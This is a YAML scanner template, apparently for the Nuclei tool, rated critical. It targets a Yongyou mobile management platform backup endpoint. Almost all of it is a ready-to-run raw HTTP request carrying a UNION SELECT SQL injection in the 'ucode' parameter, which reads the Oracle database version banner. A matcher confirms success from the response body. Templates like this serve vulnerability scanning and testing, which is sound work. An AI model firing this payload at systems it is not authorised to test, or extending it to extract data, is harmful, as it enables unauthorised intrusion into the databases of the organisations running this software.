id: yongyou-ydglpt-backup-sql

info:
  name: yongyou-ydglpt-backup-sql
  author: yongyou-ydglpt-backup-sql
  severity: critical

http:
  - raw:
      - |
        POST /maportal/usermanager/backup?ucode=1%27+union+select+banner,NULL,NULL,NULL,NULL,NULL,NULL,NULL+from+sys.v_$version+where+rownum=1--+ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 3
        Upgrade-Insecure-Requests: 1
        Pragma: no-cache
        Cache-Control: no-cache
        SL-CE-SUID: 18

        a=a


    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body,"pk_obj","primarykey")'